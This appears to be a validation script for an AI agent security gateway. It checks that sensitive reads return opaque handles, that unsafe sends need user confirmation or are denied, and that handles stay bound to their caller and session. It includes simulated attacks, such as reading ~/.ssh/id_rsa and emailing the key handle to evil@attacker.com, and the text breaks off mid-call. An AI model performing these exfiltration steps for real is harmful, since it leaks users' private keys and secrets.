from __future__ import annotations

import json
import os
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import requests

ROOT = Path(__file__).resolve().parents[1]
LAUNCH_MCP = str(ROOT / "scripts" / "launch_mcp_gateway.sh")
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from agent.mcp_client import McpError, McpStdioClient


@dataclass
class CheckResult:
    name: str
    ok: bool
    details: dict[str, Any]

    def to_dict(self) -> dict[str, Any]:
        return {"name": self.name, "ok": self.ok, "details": self.details}


def _gateway_base() -> str:
    bind = os.getenv("MIRAGE_HTTP_BIND", "127.0.0.1").strip() or "127.0.0.1"
    port = os.getenv("MIRAGE_HTTP_PORT", "8765").strip() or "8765"
    return f"http://{bind}:{port}"


def _stack_health() -> None:
    urls = [
        os.getenv("POLICY0_URL", "http://127.0.0.1:9001").rstrip("/") + "/health",
        os.getenv("POLICY1_URL", "http://127.0.0.1:9002").rstrip("/") + "/health",
        os.getenv("EXECUTOR_URL", "http://127.0.0.1:9100").rstrip("/") + "/health",
        _gateway_base().rstrip("/") + "/health",
    ]
    for url in urls:
        r = requests.get(url, timeout=1.0)
        r.raise_for_status()


def _mcp_env(session_id: str) -> dict[str, str]:
    env = os.environ.copy()
    env["MIRAGE_SESSION_ID"] = session_id
    env.setdefault("POLICY0_URL", "http://127.0.0.1:9001")
    env.setdefault("POLICY1_URL", "http://127.0.0.1:9002")
    env.setdefault("EXECUTOR_URL", "http://127.0.0.1:9100")
    env.setdefault("FSS_DOMAIN_SIZE", "4096")
    env.setdefault("MAX_TOKENS_PER_MESSAGE", "32")
    return env


def _call(session_id: str, *, intent_id: str, caller: str, inputs: dict[str, Any] | None = None, constraints: dict[str, Any] | None = None) -> dict[str, Any]:
    cmd = ["bash", LAUNCH_MCP]
    with McpStdioClient(cmd, env=_mcp_env(session_id)) as mcp:
        mcp.initialize()
        return _call_with_client(mcp, intent_id=intent_id, caller=caller, inputs=inputs, constraints=constraints)


def _call_with_client(
    mcp: McpStdioClient,
    *,
    intent_id: str,
    caller: str,
    inputs: dict[str, Any] | None = None,
    constraints: dict[str, Any] | None = None,
) -> dict[str, Any]:
    return mcp.call_tool(
        "act",
        {
            "intent_id": intent_id,
            "inputs": inputs or {},
            "constraints": constraints or {},
            "caller": caller,
        },
    )


def _http_call(
    session_id: str,
    *,
    intent_id: str,
    caller: str,
    inputs: dict[str, Any] | None = None,
    constraints: dict[str, Any] | None = None,
    auth: bool = True,
) -> tuple[int, Any]:
    url = _gateway_base().rstrip("/") + "/act"
    headers = {"X-Mirage-Session": session_id}
    token = os.getenv("MIRAGE_HTTP_TOKEN", "secureclaw-dev-token").strip()
    if auth:
        headers["Authorization"] = f"Bearer {token}"
    r = requests.post(
        url,
        json={
            "intent_id": intent_id,
            "inputs": inputs or {},
            "constraints": constraints or {},
            "caller": caller,
        },
        headers=headers,
        timeout=5.0,
    )
    try:
        body = r.json()
    except Exception:
        body = r.text
    return r.status_code, body


def run_validation() -> dict[str, Any]:
    _stack_health()

    results: list[CheckResult] = []

    session = "validate-main"
    with McpStdioClient(["bash", LAUNCH_MCP], env=_mcp_env(session)) as mcp:
        mcp.initialize()

        read_out = _call_with_client(mcp, intent_id="ReadFile", caller="nanoclaw", inputs={"path_spec": "~/.ssh/id_rsa", "purpose": "diagnostics"})
        handle = (((read_out.get("artifacts") or [{}])[0]).get("handle") if read_out.get("artifacts") else "")

        results.append(
            CheckResult(
                "read_sensitive_file_returns_handle",
                read_out.get("status") == "OK" and read_out.get("reason_code") == "SENSITIVE_HANDLE_RETURNED" and bool(handle),
                {"status": read_out.get("status"), "reason_code": read_out.get("reason_code"), "has_handle": bool(handle)},
            )
        )

        desc_ok = _call_with_client(mcp, intent_id="DescribeHandle", caller="nanoclaw", inputs={"handle": handle})
        results.append(
            CheckResult(
                "describe_handle_same_caller",
                desc_ok.get("status") == "OK" and desc_ok.get("reason_code") == "ALLOW",
                {"status": desc_ok.get("status"), "reason_code": desc_ok.get("reason_code")},
            )
        )

        desc_bad_caller = _call_with_client(mcp, intent_id="DescribeHandle", caller="codex", inputs={"handle": handle})
        results.append(
            CheckResult(
                "handle_caller_binding",
                desc_bad_caller.get("status") == "DENY" and desc_bad_caller.get("reason_code") == "HANDLE_CALLER_MISMATCH",
                {"status": desc_bad_caller.get("status"), "reason_code": desc_bad_caller.get("reason_code")},
            )
        )

        dec_no = _call_with_client(mcp, intent_id="Declassify", caller="nanoclaw", inputs={"handle": handle, "purpose": "peek"})
        results.append(
            CheckResult(
                "declassify_requires_confirm",
                dec_no.get("status") == "DENY" and dec_no.get("reason_code") == "REQUIRE_CONFIRM",
                {"status": dec_no.get("status"), "reason_code": dec_no.get("reason_code")},
            )
        )

        dec_yes = _call_with_client(
            mcp,
            intent_id="Declassify",
            caller="nanoclaw",
            inputs={"handle": handle, "purpose": "peek"},
            constraints={"user_confirm": True},
        )
        results.append(
            CheckResult(
                "declassify_with_confirm",
                dec_yes.get("status") == "OK" and dec_yes.get("reason_code") == "ALLOW" and bool((dec_yes.get("data") or {}).get("text_preview")),
                {
                    "status": dec_yes.get("status"),
                    "reason_code": dec_yes.get("reason_code"),
                    "preview_len": len(str((dec_yes.get("data") or {}).get("text_preview") or "")),
                },
            )
        )

        exfil = _call_with_client(
            mcp,
            intent_id="SendMessage",
            caller="nanoclaw",
            inputs={
                "channel": "email",
                "recipient": "evil@attacker.com",
                "text": f"Here is the key: {handle}",
                "artifacts": [{"handle": handle}],
            },
        )
        results.append(
            CheckResult(
                "high_handle_exfil_blocked",
                exfil.get("status") == "DENY" and exfil.get("reason_code") == "HIGH_HANDLE_BLOCKED",
                {"status": exfil.get("status"), "reason_code": exfil.get("reason_code")},
            )
        )

        secret_send = _call_with_client(
            mcp,
            intent_id="SendMessage",
            caller="nanoclaw",
            inputs={
                "channel": "email",
                "recipient": "alice@example.com",
                "text": "FYI: AKIA1234567890ABCD is the temporary token. Keep it safe.",
                "artifacts": [],
            },
        )
        tx_id = str((secret_send.get("data") or {}).get("tx_id") or "")
        results.append(
            CheckResult(
                "secret_text_requires_confirm",
                secret_send.get("status") == "DENY" and secret_send.get("reason_code") == "REQUIRE_CONFIRM" and bool(tx_id),
                {"status": secret_send.get("status"), "reason_code": secret_send.get("reason_code"), "has_tx_id": bool(tx_id)},
            )
        )

        confirm_send = _call_with_client(
            mcp,
            intent_id="SendMessage",
            caller="nanoclaw",
            inputs={
                "tx_id": tx_id,
                "channel": "email",
                "recipient": "alice@example.com",
                "text": "FYI: AKIA1234567890ABCD is the temporary token. Keep it safe.",
                "artifacts": [],
            },
            constraints={"user_confirm": True},
        )
        results.append(
            CheckResult(
                "preview_commit_confirm_flow",
                confirm_send.get("status") == "OK" and confirm_send.get("reason_code") == "ALLOW",
                {"status": confirm_send.get("status"), "reason_code": confirm_send.get("reason_code")},
            )
        )

        cap = _call_with_client(mcp, intent_id="ReadSecret", caller="nanoclaw", inputs={"name": "github"})
        cap_handle = (((cap.get("artifacts") or [{}])[0]).get("handle") if cap.get("artifacts") else "")
        results.append(
            CheckResult(
                "read_secret_returns_capability_handle",
                cap.get("status") == "OK" and cap.get("reason_code") == "CAPABILITY_HANDLE" and bool(cap_handle),
                {"status": cap.get("status"), "reason_code": cap.get("reason_code"), "has_handle": bool(cap_handle)},
            )
        )

        use_cap = _call_with_client(mcp, intent_id="UseCredential", caller="nanoclaw", inputs={"handle": cap_handle, "op": "SIGN", "target": "example.com"})
        results.append(
            CheckResult(
                "use_credential_same_caller",
                use_cap.get("status") == "OK" and use_cap.get("reason_code") == "ALLOW",
                {"status": use_cap.get("status"), "reason_code": use_cap.get("reason_code")},
            )
        )

        use_cap_bad = _call_with_client(mcp, intent_id="UseCredential", caller="codex", inputs={"handle": cap_handle, "op": "SIGN", "target": "example.com"})
        results.append(
            CheckResult(
                "capability_handle_caller_binding",
                use_cap_bad.get("status") == "DENY" and use_cap_bad.get("reason_code") == "HANDLE_CALLER_MISMATCH",
                {"status": use_cap_bad.get("status"), "reason_code": use_cap_bad.get("reason_code")},
            )
        )

        fetch = _call_with_client(mcp, intent_id="FetchResource", caller="nanoclaw", inputs={"resource_id": "https://api.github.com"})
        results.append(
            CheckResult(
                "fetch_resource_allow_path",
                fetch.get("status") == "OK" and fetch.get("reason_code") == "ALLOW",
                {"status": fetch.get("status"), "reason_code": fetch.get("reason_code")},
            )
        )

        openclaw_send = _call_with_client(
            mcp,
            intent_id="SendMessage",
            caller="openclaw",
            inputs={"channel": "email", "recipient": "alice@example.com", "text": "hello", "artifacts": []},
        )
        results.append(
            CheckResult(
                "openclaw_default_send_capability_denied",
                openclaw_send.get("status") == "DENY" and openclaw_send.get("reason_code") == "CAPABILITY_DENY",
                {"status": openclaw_send.get("status"), "reason_code": openclaw_send.get("reason_code")},
            )
        )

        external_no_delegation = _call_with_client(
            mcp,
            intent_id="SendMessage",
            caller="nanoclaw",
            inputs={"channel": "email", "recipient": "alice@example.com", "text": "hello", "artifacts": []},
            constraints={"external_principal": "user:alice"},
        )
        results.append(
            CheckResult(
                "external_principal_requires_delegation",
                external_no_delegation.get("status") == "DENY" and external_no_delegation.get("reason_code") == "DELEGATION_REQUIRED",
                {"status": external_no_delegation.get("status"), "reason_code": external_no_delegation.get("reason_code")},
            )
        )

    desc_bad_session = _call("validate-other-session", intent_id="DescribeHandle", caller="nanoclaw", inputs={"handle": handle})
    results.append(
        CheckResult(
            "handle_session_binding",
            desc_bad_session.get("status") == "DENY" and desc_bad_session.get("reason_code") == "HANDLE_INVALID",
            {"status": desc_bad_session.get("status"), "reason_code": desc_bad_session.get("reason_code")},
        )
    )

    http_no_auth_status, http_no_auth_body = _http_call(
        "validate-http",
        intent_id="SendMessage",
        caller="nanoclaw",
        inputs={"channel": "email", "recipient": "alice@example.com", "text": "hello", "artifacts": []},
        auth=False,
    )
    results.append(
        CheckResult(
            "http_gateway_requires_bearer_token",
            int(http_no_auth_status) == 401,
            {"status_code": int(http_no_auth_status), "body": http_no_auth_body},
        )
    )

    http_auth_status, http_auth_body = _http_call(
        "validate-http",
        intent_id="CheckFetchPolicy",
        caller="nanoclaw",
        inputs={"resource_id": "https://api.github.com", "domain": "example.com"},
        auth=True,
    )
    results.append(
        CheckResult(
            "http_gateway_authenticated_request",
            int(http_auth_status) == 200 and isinstance(http_auth_body, dict) and http_auth_body.get("status") in {"OK", "DENY"},
            {"status_code": int(http_auth_status), "body": http_auth_body},
        )
    )

    proxy_env = _mcp_env("validate-proxy")
    proxy_env["MIRAGE_GATEWAY_HTTP_URL"] = _gateway_base()
    proxy_env["MIRAGE_HTTP_TOKEN"] = os.getenv("MIRAGE_HTTP_TOKEN", "secureclaw-dev-token").strip()
    with McpStdioClient(["python", "-m", "capsule.mcp_proxy"], env=proxy_env) as mcp:
        mcp.initialize()
        proxied = mcp.call_tool(
            "act",
            {
                "intent_id": "FetchResource",
                "inputs": {"resource_id": "https://api.github.com"},
                "constraints": {},
                "caller": "nanoclaw",
            },
        )
    results.append(
        CheckResult(
            "capsule_http_mcp_proxy",
            proxied.get("status") == "OK" and proxied.get("reason_code") == "ALLOW",
            {"status": proxied.get("status"), "reason_code": proxied.get("reason_code")},
        )
    )

    plain_block = _call(
        "validate-plain-block",
        intent_id="SendMessage",
        caller="nanoclaw",
        inputs={"channel": "email", "recipient": "evil@attacker.com", "text": "hello", "artifacts": []},
    )
    results.append(
        CheckResult(
            "plain_recipient_blocked",
            plain_block.get("status") == "DENY" and plain_block.get("reason_code") == "RECIPIENT_NOT_ALLOWED",
            {"status": plain_block.get("status"), "reason_code": plain_block.get("reason_code")},
        )
    )

    dry_msg_block = _call(
        "validate-dry-msg-block",
        intent_id="CheckMessagePolicy",
        caller="nanoclaw",
        inputs={"channel": "email", "recipient": "evil@attacker.com", "text": "hello", "artifacts": []},
    )
    results.append(
        CheckResult(
            "check_message_policy_blocked_recipient",
            dry_msg_block.get("status") == "DENY" and dry_msg_block.get("reason_code") == "RECIPIENT_NOT_ALLOWED",
            {"status": dry_msg_block.get("status"), "reason_code": dry_msg_block.get("reason_code")},
        )
    )

    dry_fetch_block = _call(
        "validate-dry-fetch-block",
        intent_id="CheckFetchPolicy",
        caller="nanoclaw",
        inputs={"resource_id": "https://evil.example.com", "domain": "evil.example.com"},
    )
    results.append(
        CheckResult(
            "check_fetch_policy_blocked_domain",
            dry_fetch_block.get("status") == "DENY" and dry_fetch_block.get("reason_code") == "DOMAIN_NOT_ALLOWED",
            {"status": dry_fetch_block.get("status"), "reason_code": dry_fetch_block.get("reason_code")},
        )
    )

    fetch_block = _call(
        "validate-fetch-block",
        intent_id="FetchResource",
        caller="nanoclaw",
        inputs={"resource_id": "https://evil.example.com", "domain": "evil.example.com"},
    )
    results.append(
        CheckResult(
            "fetch_resource_blocked_domain",
            fetch_block.get("status") == "DENY" and fetch_block.get("reason_code") == "DOMAIN_NOT_ALLOWED",
            {"status": fetch_block.get("status"), "reason_code": fetch_block.get("reason_code")},
        )
    )

    webhook_no = _call(
        "validate-webhook-no",
        intent_id="PostWebhook",
        caller="nanoclaw",
        inputs={"domain": "api.github.com", "path": "/x", "body": "AKIA1234567890ABCD hello"},
    )
    results.append(
        CheckResult(
            "webhook_secret_requires_confirm",
            webhook_no.get("status") == "DENY" and webhook_no.get("reason_code") == "REQUIRE_CONFIRM",
            {"status": webhook_no.get("status"), "reason_code": webhook_no.get("reason_code")},
        )
    )

    webhook_yes = _call(
        "validate-webhook-yes",
        intent_id="PostWebhook",
        caller="nanoclaw",
        inputs={"domain": "api.github.com", "path": "/x", "body": "AKIA1234567890ABCD hello"},
        constraints={"user_confirm": True},
    )
    results.append(
        CheckResult(
            "webhook_secret_with_confirm",
            webhook_yes.get("status") == "OK" and webhook_yes.get("reason_code") == "ALLOW",
            {"status": webhook_yes.get("status"), "reason_code": webhook_yes.get("reason_code")},
        )
    )

    tx_preview_status, tx_preview_body = _http_call(
        "validate-http-tx-a",
        intent_id="SendMessage",
        caller="nanoclaw",
        inputs={
            "channel": "email",
            "recipient": "alice@example.com",
            "text": "AKIA1234567890ABCD hello",
            "artifacts": [],
        },
        auth=True,
    )
    tx_preview_data = (tx_preview_body.get("data") or {}) if isinstance(tx_preview_body, dict) else {}
    tx_id = str(tx_preview_data.get("tx_id") or "")
    results.append(
        CheckResult(
            "http_tx_preview_requires_confirm",
            int(tx_preview_status) == 200
            and isinstance(tx_preview_body, dict)
            and tx_preview_body.get("status") == "DENY"
            and tx_preview_body.get("reason_code") == "REQUIRE_CONFIRM"
            and bool(tx_id),
            {
                "status_code": int(tx_preview_status),
                "status": tx_preview_body.get("status") if isinstance(tx_preview_body, dict) else None,
                "reason_code": tx_preview_body.get("reason_code") if isinstance(tx_preview_body, dict) else None,
                "has_tx_id": bool(tx_id),
            },
        )
    )

    tx_session_status, tx_session_body = _http_call(
        "validate-http-tx-b",
        intent_id="SendMessage",
        caller="nanoclaw",
        inputs={
            "tx_id": tx_id,
            "channel": "email",
            "recipient": "alice@example.com",
            "text": "AKIA1234567890ABCD hello",
            "artifacts": [],
        },
        constraints={"user_confirm": True},
        auth=True,
    )
    results.append(
        CheckResult(
            "http_tx_session_binding",
            int(tx_session_status) == 200
            and isinstance(tx_session_body, dict)
            and tx_session_body.get("status") == "DENY"
            and tx_session_body.get("reason_code") == "TX_SESSION_MISMATCH",
            {
                "status_code": int(tx_session_status),
                "status": tx_session_body.get("status") if isinstance(tx_session_body, dict) else None,
                "reason_code": tx_session_body.get("reason_code") if isinstance(tx_session_body, dict) else None,
            },
        )
    )

    tx_caller_status, tx_caller_body = _http_call(
        "validate-http-tx-a",
        intent_id="SendMessage",
        caller="codex",
        inputs={
            "tx_id": tx_id,
            "channel": "email",
            "recipient": "alice@example.com",
            "text": "AKIA1234567890ABCD hello",
            "artifacts": [],
        },
        constraints={"user_confirm": True},
        auth=True,
    )
    results.append(
        CheckResult(
            "http_tx_caller_binding",
            int(tx_caller_status) == 200
            and isinstance(tx_caller_body, dict)
            and tx_caller_body.get("status") == "DENY"
            and tx_caller_body.get("reason_code") == "TX_CALLER_MISMATCH",
            {
                "status_code": int(tx_caller_status),
                "status": tx_caller_body.get("status") if isinstance(tx_caller_body, dict) else None,
                "reason_code": tx_caller_body.get("reason_code") if isinstance(tx_caller_body, dict) else None,
            },
        )
    )

    tx_payload_status, tx_payload_body = _http_call(
        "validate-http-tx-a",
        intent_id="SendMessage",
        caller="nanoclaw",
        inputs={
            "tx_id": tx_id,
            "channel": "email",
            "recipient": "alice@example.com",
            "text": "AKIA1234567890ABCD hello MOD",
            "artifacts": [],
        },
        constraints={"user_confirm": True},
        auth=True,
    )
    results.append(
        CheckResult(
            "http_tx_payload_binding",
            int(tx_payload_status) == 200
            and isinstance(tx_payload_body, dict)
            and tx_payload_body.get("status") == "DENY"
            and tx_payload_body.get("reason_code") == "BAD_COMMIT_PROOF",
            {
                "status_code": int(tx_payload_status),
                "status": tx_payload_body.get("status") if isinstance(tx_payload_body, dict) else None,
                "reason_code": tx_payload_body.get("reason_code") if isinstance(tx_payload_body, dict) else None,
            },
        )
    )

    tx_commit_status, tx_commit_body = _http_call(
        "validate-http-tx-a",
        intent_id="SendMessage",
        caller="nanoclaw",
        inputs={
            "tx_id": tx_id,
            "channel": "email",
            "recipient": "alice@example.com",
            "text": "AKIA1234567890ABCD hello",
            "artifacts": [],
        },
        constraints={"user_confirm": True},
        auth=True,
    )
    results.append(
        CheckResult(
            "http_tx_commit_allow",
            int(tx_commit_status) == 200
            and isinstance(tx_commit_body, dict)
            and tx_commit_body.get("status") == "OK"
            and tx_commit_body.get("reason_code") == "ALLOW",
            {
                "status_code": int(tx_commit_status),
                "status": tx_commit_body.get("status") if isinstance(tx_commit_body, dict) else None,
                "reason_code": tx_commit_body.get("reason_code") if isinstance(tx_commit_body, dict) else None,
            },
        )
    )

    tx_replay_status, tx_replay_body = _http_call(
        "validate-http-tx-a",
        intent_id="SendMessage",
        caller="nanoclaw",
        inputs={
            "tx_id": tx_id,
            "channel": "email",
            "recipient": "alice@example.com",
            "text": "AKIA1234567890ABCD hello",
            "artifacts": [],
        },
        constraints={"user_confirm": True},
        auth=True,
    )
    results.append(
        CheckResult(
            "http_tx_replay_guard",
            int(tx_replay_status) == 200
            and isinstance(tx_replay_body, dict)
            and tx_replay_body.get("status") == "DENY"
            and tx_replay_body.get("reason_code") == "REPLAY_DENY",
            {
                "status_code": int(tx_replay_status),
                "status": tx_replay_body.get("status") if isinstance(tx_replay_body, dict) else None,
                "reason_code": tx_replay_body.get("reason_code") if isinstance(tx_replay_body, dict) else None,
            },
        )
    )

    rev_read_status, rev_read_body = _http_call(
        "validate-revoke-handle",
        intent_id="ReadSecret",
        caller="nanoclaw",
        inputs={"name": "github"},
        auth=True,
    )
    rev_handle = ""
    if isinstance(rev_read_body, dict) and rev_read_body.get("artifacts"):
        rev_handle = str(((rev_read_body.get("artifacts") or [{}])[0]).get("handle") or "")
    results.append(
        CheckResult(
            "http_revoke_handle_setup",
            int(rev_read_status) == 200
            and isinstance(rev_read_body, dict)
            and rev_read_body.get("status") == "OK"
            and bool(rev_handle),
            {
                "status_code": int(rev_read_status),
                "status": rev_read_body.get("status") if isinstance(rev_read_body, dict) else None,
                "reason_code": rev_read_body.get("reason_code") if isinstance(rev_read_body, dict) else None,
                "has_handle": bool(rev_handle),
            },
        )
    )

    rev_no_status, rev_no_body = _http_call(
        "validate-revoke-handle",
        intent_id="RevokeHandle",
        caller="nanoclaw",
        inputs={"handle": rev_handle},
        auth=True,
    )
    results.append(
        CheckResult(
            "revoke_handle_requires_confirm",
            int(rev_no_status) == 200
            and isinstance(rev_no_body, dict)
            and rev_no_body.get("status") == "DENY"
            and rev_no_body.get("reason_code") == "REQUIRE_CONFIRM",
            {
                "status_code": int(rev_no_status),
                "status": rev_no_body.get("status") if isinstance(rev_no_body, dict) else None,
                "reason_code": rev_no_body.get("reason_code") if isinstance(rev_no_body, dict) else None,
            },
        )
    )

    rev_yes_status, rev_yes_body = _http_call(
        "validate-revoke-handle",
        intent_id="RevokeHandle",
        caller="nanoclaw",
        inputs={"handle": rev_handle},
        constraints={"user_confirm": True},
        auth=True,
    )
    results.append(
        CheckResult(
            "revoke_handle_with_confirm",
            int(rev_yes_status) == 200
            and isinstance(rev_yes_body, dict)
            and rev_yes_body.get("status") == "OK"
            and rev_yes_body.get("reason_code") == "ALLOW",
            {
                "status_code": int(rev_yes_status),
                "status": rev_yes_body.get("status") if isinstance(rev_yes_body, dict) else None,
                "reason_code": rev_yes_body.get("reason_code") if isinstance(rev_yes_body, dict) else None,
            },
        )
    )

    revoked_use_status, revoked_use_body = _http_call(
        "validate-revoke-handle",
        intent_id="UseCredential",
        caller="nanoclaw",
        inputs={"handle": rev_handle, "op": "SIGN", "target": "example.com"},
        auth=True,
    )
    results.append(
        CheckResult(
            "revoked_handle_cannot_be_used",
            int(revoked_use_status) == 200
            and isinstance(revoked_use_body, dict)
            and revoked_use_body.get("status") == "DENY"
            and revoked_use_body.get("reason_code") == "HANDLE_INVALID",
            {
                "status_code": int(revoked_use_status),
                "status": revoked_use_body.get("status") if isinstance(revoked_use_body, dict) else None,
                "reason_code": revoked_use_body.get("reason_code") if isinstance(revoked_use_body, dict) else None,
            },
        )
    )

    session_preview_status, session_preview_body = _http_call(
        "validate-revoke-session",
        intent_id="SendMessage",
        caller="nanoclaw",
        inputs={
            "channel": "email",
            "recipient": "alice@example.com",
            "text": "AKIA1234567890ABCD hello",
            "artifacts": [],
        },
        auth=True,
    )
    session_tx = ""
    if isinstance(session_preview_body, dict):
        session_tx = str(((session_preview_body.get("data") or {}).get("tx_id")) or "")
    session_read_status, session_read_body = _http_call(
        "validate-revoke-session",
        intent_id="ReadFile",
        caller="nanoclaw",
        inputs={"path_spec": "~/.ssh/id_rsa", "purpose": "diagnostics"},
        auth=True,
    )
    session_handle = ""
    if isinstance(session_read_body, dict) and session_read_body.get("artifacts"):
        session_handle = str(((session_read_body.get("artifacts") or [{}])[0]).get("handle") or "")
    results.append(
        CheckResult(
            "http_revoke_session_setup",
            int(session_preview_status) == 200
            and int(session_read_status) == 200
            and isinstance(session_preview_body, dict)
            and isinstance(session_read_body, dict)
            and bool(session_tx)
            and bool(session_handle),
            {
                "preview_status": session_preview_body.get("status") if isinstance(session_preview_body, dict) else None,
                "preview_reason": session_preview_body.get("reason_code") if isinstance(session_preview_body, dict) else None,
                "has_tx_id": bool(session_tx),
                "read_status": session_read_body.get("status") if isinstance(session_read_body, dict) else None,
                "read_reason": session_read_body.get("reason_code") if isinstance(session_read_body, dict) else None,
                "has_handle": bool(session_handle),
            },
        )
    )

    rev_session_no_status, rev_session_no_body = _http_call(
        "validate-revoke-session",
        intent_id="RevokeSession",
        caller="nanoclaw",
        inputs={},
        auth=True,
    )
    results.append(
        CheckResult(
            "revoke_session_requires_confirm",
            int(rev_session_no_status) == 200
            and isinstance(rev_session_no_body, dict)
            and rev_session_no_body.get("status") == "DENY"
            and rev_session_no_body.get("reason_code") == "REQUIRE_CONFIRM",
            {
                "status_code": int(rev_session_no_status),
                "status": rev_session_no_body.get("status") if isinstance(rev_session_no_body, dict) else None,
                "reason_code": rev_session_no_body.get("reason_code") if isinstance(rev_session_no_body, dict) else None,
            },
        )
    )

    rev_session_yes_status, rev_session_yes_body = _http_call(
        "validate-revoke-session",
        intent_id="RevokeSession",
        caller="nanoclaw",
        inputs={},
        constraints={"user_confirm": True},
        auth=True,
    )
    rev_session_data = (rev_session_yes_body.get("data") or {}) if isinstance(rev_session_yes_body, dict) else {}
    results.append(
        CheckResult(
            "revoke_session_with_confirm",
            int(rev_session_yes_status) == 200
            and isinstance(rev_session_yes_body, dict)
            and rev_session_yes_body.get("status") == "OK"
            and rev_session_yes_body.get("reason_code") == "ALLOW"
            and int(rev_session_data.get("revoked_handles", 0)) >= 1
            and int(rev_session_data.get("revoked_tx", 0)) >= 1,
            {
                "status_code": int(rev_session_yes_status),
                "status": rev_session_yes_body.get("status") if isinstance(rev_session_yes_body, dict) else None,
                "reason_code": rev_session_yes_body.get("reason_code") if isinstance(rev_session_yes_body, dict) else None,
                "revoked_handles": int(rev_session_data.get("revoked_handles", 0)),
                "revoked_tx": int(rev_session_data.get("revoked_tx", 0)),
            },
        )
    )

    revoked_desc_status, revoked_desc_body = _http_call(
        "validate-revoke-session",
        intent_id="DescribeHandle",
        caller="nanoclaw",
        inputs={"handle": session_handle},
        auth=True,
    )
    results.append(
        CheckResult(
            "revoked_session_handle_invalid",
            int(revoked_desc_status) == 200
            and isinstance(revoked_desc_body, dict)
            and revoked_desc_body.get("status") == "DENY"
            and revoked_desc_body.get("reason_code") == "HANDLE_INVALID",
            {
                "status_code": int(revoked_desc_status),
                "status": revoked_desc_body.get("status") if isinstance(revoked_desc_body, dict) else None,
                "reason_code": revoked_desc_body.get("reason_code") if isinstance(revoked_desc_body, dict) else None,
            },
        )
    )

    revoked_tx_status, revoked_tx_body = _http_call(
        "validate-revoke-session",
        intent_id="SendMessage",
        caller="nanoclaw",
        inputs={
            "tx_id": session_tx,
            "channel": "email",
            "recipient": "alice@example.com",
            "text": "AKIA1234567890ABCD hello",
            "artifacts": [],
        },
        constraints={"user_confirm": True},
        auth=True,
    )
    results.append(
        CheckResult(
            "revoked_session_tx_invalid",
            int(revoked_tx_status) == 200
            and isinstance(revoked_tx_body, dict)
            and revoked_tx_body.get("status") == "DENY"
            and revoked_tx_body.get("reason_code") == "TX_INVALID",
            {
                "status_code": int(revoked_tx_status),
                "status": revoked_tx_body.get("status") if isinstance(revoked_tx_body, dict) else None,
                "reason_code": revoked_tx_body.get("reason_code") if isinstance(revoked_tx_body, dict) else None,
            },
        )
    )

    inter_send_status, inter_send_body = _http_call(
        "validate-interagent",
        intent_id="SendInterAgentMessage",
        caller="nanoclaw",
        inputs={"to_agent": "alice-agent", "text": "AKIA1234567890ABCD hello"},
        auth=True,
    )
    inter_payload = ""
    if isinstance(inter_send_body, dict) and inter_send_body.get("artifacts"):
        inter_payload = str(((inter_send_body.get("artifacts") or [{}])[0]).get("handle") or "")
    results.append(
        CheckResult(
            "interagent_send_secret_as_opaque_handle",
            int(inter_send_status) == 200
            and isinstance(inter_send_body, dict)
            and inter_send_body.get("status") == "OK"
            and inter_send_body.get("reason_code") == "ALLOW"
            and bool(inter_payload),
            {
                "status_code": int(inter_send_status),
                "status": inter_send_body.get("status") if isinstance(inter_send_body, dict) else None,
                "reason_code": inter_send_body.get("reason_code") if isinstance(inter_send_body, dict) else None,
                "has_payload_handle": bool(inter_payload),
            },
        )
    )

    inter_recv_status, inter_recv_body = _http_call(
        "validate-interagent",
        intent_id="ReceiveInterAgentMessages",
        caller="alice-agent",
        inputs={"agent_id": "alice-agent", "max_messages": 10},
        auth=True,
    )
    inter_recv_messages = ((inter_recv_body.get("data") or {}).get("messages") or []) if isinstance(inter_recv_body, dict) else []
    recv_payload = str((inter_recv_messages[0] or {}).get("payload_handle") or "") if inter_recv_messages else ""
    results.append(
        CheckResult(
            "interagent_receive_opaque_message",
            int(inter_recv_status) == 200
            and isinstance(inter_recv_body, dict)
            and inter_recv_body.get("status") == "OK"
            and inter_recv_body.get("reason_code") == "ALLOW"
            and bool(recv_payload),
            {
                "status_code": int(inter_recv_status),
                "status": inter_recv_body.get("status") if isinstance(inter_recv_body, dict) else None,
                "reason_code": inter_recv_body.get("reason_code") if isinstance(inter_recv_body, dict) else None,
                "message_count": len(inter_recv_messages),
                "has_payload_handle": bool(recv_payload),
            },
        )
    )

    inter_desc_ok_status, inter_desc_ok_body = _http_call(
        "validate-interagent",
        intent_id="DescribeHandle",
        caller="alice-agent",
        inputs={"handle": recv_payload},
        auth=True,
    )
    results.append(
        CheckResult(
            "interagent_received_handle_bound_to_receiver",
            int(inter_desc_ok_status) == 200
            and isinstance(inter_desc_ok_body, dict)
            and inter_desc_ok_body.get("status") == "OK"
            and inter_desc_ok_body.get("reason_code") == "ALLOW",
            {
                "status_code": int(inter_desc_ok_status),
                "status": inter_desc_ok_body.get("status") if isinstance(inter_desc_ok_body, dict) else None,
                "reason_code": inter_desc_ok_body.get("reason_code") if isinstance(inter_desc_ok_body, dict) else None,
            },
        )
    )

    inter_desc_bad_status, inter_desc_bad_body = _http_call(
        "validate-interagent",
        intent_id="DescribeHandle",
        caller="nanoclaw",
        inputs={"handle": recv_payload},
        auth=True,
    )
    results.append(
        CheckResult(
            "interagent_sender_cannot_describe_receiver_handle",
            int(inter_desc_bad_status) == 200
            and isinstance(inter_desc_bad_body, dict)
            and inter_desc_bad_body.get("status") == "DENY"
            and inter_desc_bad_body.get("reason_code") == "HANDLE_CALLER_MISMATCH",
            {
                "status_code": int(inter_desc_bad_status),
                "status": inter_desc_bad_body.get("status") if isinstance(inter_desc_bad_body, dict) else None,
                "reason_code": inter_desc_bad_body.get("reason_code") if isinstance(inter_desc_bad_body, dict) else None,
            },
        )
    )

    inter_dec_no_status, inter_dec_no_body = _http_call(
        "validate-interagent",
        intent_id="Declassify",
        caller="alice-agent",
        inputs={"handle": recv_payload, "purpose": "review"},
        auth=True,
    )
    results.append(
        CheckResult(
            "interagent_receiver_declassify_requires_confirm",
            int(inter_dec_no_status) == 200
            and isinstance(inter_dec_no_body, dict)
            and inter_dec_no_body.get("status") == "DENY"
            and inter_dec_no_body.get("reason_code") == "REQUIRE_CONFIRM",
            {
                "status_code": int(inter_dec_no_status),
                "status": inter_dec_no_body.get("status") if isinstance(inter_dec_no_body, dict) else None,
                "reason_code": inter_dec_no_body.get("reason_code") if isinstance(inter_dec_no_body, dict) else None,
            },
        )
    )

    inter_dec_yes_status, inter_dec_yes_body = _http_call(
        "validate-interagent",
        intent_id="Declassify",
        caller="alice-agent",
